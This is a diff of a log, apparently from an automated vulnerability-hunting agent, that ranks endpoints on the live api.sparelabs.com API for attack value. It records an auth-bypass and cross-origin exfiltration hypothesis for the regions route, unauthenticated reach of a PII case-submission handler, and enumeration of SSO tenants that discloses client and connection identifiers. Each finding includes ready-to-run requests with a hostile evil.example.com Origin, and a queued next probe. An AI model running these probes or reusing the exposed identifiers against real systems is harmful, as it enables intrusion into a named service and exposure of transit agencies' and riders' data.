@@ -1,1 +1,34 @@
-## 2026-08-18 19:19:40 UTC [web] (model laguna)
+## 2026-08-18 19:46:33 UTC [web] (model laguna)
+[PRIO] api.sparelabs.com/v1/global/regions — score: 9.3 — attack=9, business=9, tech=7, gate=10, cloud=8, fresh=8
+[PRIO] api.sparelabs.com/v1/public/engage/cases POST — score: 8.3 — attack=8, business=8, tech=8, gate=10, cloud=6, fresh=9
+[PRIO] api.sparelabs.com/v1/identity/workos/auth POST — score: 7.65 — attack=6, business=6, tech=9, gate=10, cloud=5, fresh=9
+[PRIO] api.sparelabs.com/v1/global/organizations — score: 7.0 — attack=7, business=6, tech=5, gate=10, cloud=5, fresh=10
+[PRIO] api.sparelabs.com/v1/public/organizations/key/{key} — score: 6.75 — attack=6, business=6, tech=7, gate=10, cloud=4, fresh=9
+[HYP] Scheme-only Bearer bypass exposes fleet topology + write-method CORS chain on regions route
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 96
+reasoning: `Authorization: Bearer x` (scheme validated, token never verified) returns HTTP 200 + 725B body listing 7 regions (CA/US/US2/US3/JP/EU/UAT) each with apiUrl + routingHost; byte-stable sha256 fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe verified live 2026-08-16 19:46 UTC (86h+ stable); multi-version envoy LB replica-split deterministic (8/8 fast replicas bypass); OPTIONS 204 confirms PUT/PATCH/POST/DELETE with ACAO+ACAC (write-method CORS chain convergence confirmed this cycle).
+evidence_needed: GET /v1/global/regions with Bearer x + Origin → 200 + 725B matching sha256 + ACAO:reflected + ACAC:true; POST → 401 InvalidTokenError (read-only confirmed)
+verify_steps: PASSIVE: GET https://api.sparelabs.com/v1/global/regions -H "Authorization: Bearer x" -H "Origin: https://evil.example.com" --max-time 15 → confirm 200 + 725B matching sha256 + ACAO + ACAC; OPTIONS https://api.sparelabs.com/v1/global/regions -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: Authorization" → confirm 204 + ACAO + ACAC + Allow-Methods write verbs
+impact: Complete fleet topology disclosure (7 regions × {apiUrl, routingHost}) incl 6 OOS api/routing subdomains; universal CORS enables cross-origin exfiltration via victim browser; write-method CORS chain advertises but handler enforces 401 on writes (read-only bypass). Severity HIGH.
+testability: PASSIVE
+[HYP] Auth-gate-absent on engage/cases POST — handler reached without 401, feature-flag gate not auth gate
+class: BUSLOGIC
+asset: api.sparelabs.com/v1/public/engage/cases POST
+confidence: 90
+reasoning: Pipeline order confirmed via full-payload test: validation → org UUID → feature-flag gate → caseTypeId validation → handler (auth gate structurally absent). Empty POST → 400 ValidationError (NOT 401 InvalidTokenError). nil-UUID org → 404 NotFoundError "Other was not found" (handler reached). Valid org UUIDs (spare/grt/dallas/winnipeg) → 403 ForbiddenError "External case creation is not enabled" (feature-flag gate, NOT auth gate). nil-caseTypeId → 403 (feature-flag check precedes caseTypeId validation). CORS reflected on all handler-level responses (ACAO:evil + ACAC:true + full methods). Same pattern confirmed on `/v1/public/engage/caseForms POST`.
+evidence_needed: Empty POST → 400 ValidationError (no 401); valid org UUID + caseTypeId + contactInfo → 403 ForbiddenError + ACAO + ACAC; valid org UUID + nil caseTypeId → 403 (proves feature-flag precedes caseTypeId validation)
+verify_steps: PASSIVE: POST https://api.sparelabs.com/v1/public/engage/cases -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"organizationId":"d736519f-f384-4771-a2d2-4f95e884d790","caseTypeId":"00000000-0000-0000-0000-000000000000","contactInfo":{"phone":"+15555555555"}}' → confirm 403 ForbiddenError + ACAO + ACAC (spare UUID via org-key oracle); POST -d '{"organizationId":"d736519f-f384-4771-a2d2-4f95e884d790"}' → confirm 403 (nil-caseTypeId → feature-flag precedes validation)
+impact: If any org enables external case creation, unauthenticated cross-origin PII case submission with full handler reach before auth; PII fields exist at schema level (mobilityPlusIdNumber, expiry, easyGoFareCardNumber); 403/404 differential enables cross-route org-UUID oracle validation. Severity HIGH conditional.
+testability: PASSIVE
+[HYP] Unauthenticated SSO-config oracle enumerates transit-municipal tenant roster with state reflection
+class: IDOR
+asset: api.sparelabs.com/v1/identity/workos/auth POST
+confidence: 88
+reasoning: POST {"domain":"spare.com"} → 200 + 172B disclosing WorkOS client_id (client_01F5KHYX32TCKB1E7YEAPE0H17) + connection_id (conn_01GRW7M1CJEJGYKMEMPBCQEZHY) + Entra tenant_id in relayState JWT + state reflected unescaped in authorizeUrl; 11+ distinct tenants confirmed live (spare.com, dart.org, translink.ca, saskatoon.ca, mbta.com, oakville.ca, cota.com, kingcounty.gov, winnipeg.ca +2 more → 200; grt.ca → 404); fleet-parity across 7 hosts (prod+staging+us2+jp); redirect_uri silently dropped (param injection dead → state-only reflection); state value injected as PROBE_INJ reflected verbatim: `state=PROBE_INJ`.
+evidence_needed: POST spare.com → 200 + ACAO+ACAC + WorkOS client_id + connection_id + state reflected unescaped in authorizeUrl; ≥11 distinct connection_ids; 404 on non-tenant domains (grt.ca)
+verify_steps: PASSIVE: POST https://api.sparelabs.com/v1/identity/workos/auth -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"domain":"spare.com","state":"PROBE_INJ"}' → confirm 200 + ACAO+ACAC + state reflected unescaped in authorizeUrl; POST -d '{"domain":"grt.ca"}' → confirm 404 (differential); POST https://api.staging.sparelabs.com/v1/identity/workos/auth -d '{"domain":"spare.com"}' → confirm 200 with staging client_id
+impact: SSO tenant enumeration (11+ transit agencies/municipalities) + WorkOS client_id + connection_id disclosure + Entra tenant IDs + state parameter reflection (login-CSRF candidate via state if relayState binding weak). Severity LOW-MEDIUM.
+testability: PASSIVE
+[NEXT] PROBE: POST https://api.sparelabs.com/v1/public/engage/cases -H "Origin: https://evil.example.com" -H "Content-Type: application/json" -d '{"organizationId":"d736519f-f384-4771-a2d2-4f95e884d790","caseTypeId":"00000000-0000-0000-0000-000000000000","contactInfo":{"phone":"+15555555555"}}' → confirm 403 ForbiddenError + ACAO:https://evil.example.com + ACAC:true; simultaneously POST -d '{"organizationId":"d736519f-f384-4771-a2d2-4f95e884d790"}' → confirm 403 (nil-caseTypeId → proves feature-flag gate precedes caseTypeId validation, confirms pipeline order: validation → org-uuid → feature-flag → caseTypeId → handler)
